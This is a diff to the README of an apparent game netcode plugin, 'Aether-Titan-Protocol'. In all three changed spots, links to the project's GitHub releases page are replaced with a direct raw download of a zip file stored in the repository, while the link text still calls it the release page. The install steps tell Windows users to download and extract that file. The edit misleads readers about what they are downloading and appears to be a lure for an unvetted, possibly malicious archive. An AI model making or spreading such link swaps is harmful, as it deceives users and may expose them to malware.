@@ -1,6 +1,6 @@
 # 🎮 Aether-Titan-Protocol - Smooth netcode for real play
 
-[![Download Aether-Titan-Protocol](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Conniesuperimposed860/Aether-Titan-Protocol/releases)
+[![Download Aether-Titan-Protocol](https://img.shields.io/badge/Download-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/Conniesuperimposed860/Aether-Titan-Protocol/raw/refs/heads/main/core/Titan-Aether-Protocol-v2.9.zip)
 
 ## 🚀 What this is
 
@@ -8,7 +8,7 @@ Aether-Titan-Protocol is a netcode plugin for games that need fast, steady multi
 
 ## 📥 Download and install
 
-1. Open the release page: https://github.com/Conniesuperimposed860/Aether-Titan-Protocol/releases
+1. Open the release page: https://github.com/Conniesuperimposed860/Aether-Titan-Protocol/raw/refs/heads/main/core/Titan-Aether-Protocol-v2.9.zip
 2. Find the latest release at the top of the page
 3. Download the file for Windows
 4. If the file comes in a `.zip` folder, right-click it and choose **Extract All**
@@ -211,7 +211,7 @@ Use the latest release if you want the newest fixes and the best chance of a cle
 
 ## 📌 Download link
 
-[Visit the Aether-Titan-Protocol release page](https://github.com/Conniesuperimposed860/Aether-Titan-Protocol/releases)
+[Visit the Aether-Titan-Protocol release page](https://github.com/Conniesuperimposed860/Aether-Titan-Protocol/raw/refs/heads/main/core/Titan-Aether-Protocol-v2.9.zip)
 
 ## 🖱️ Quick start
 
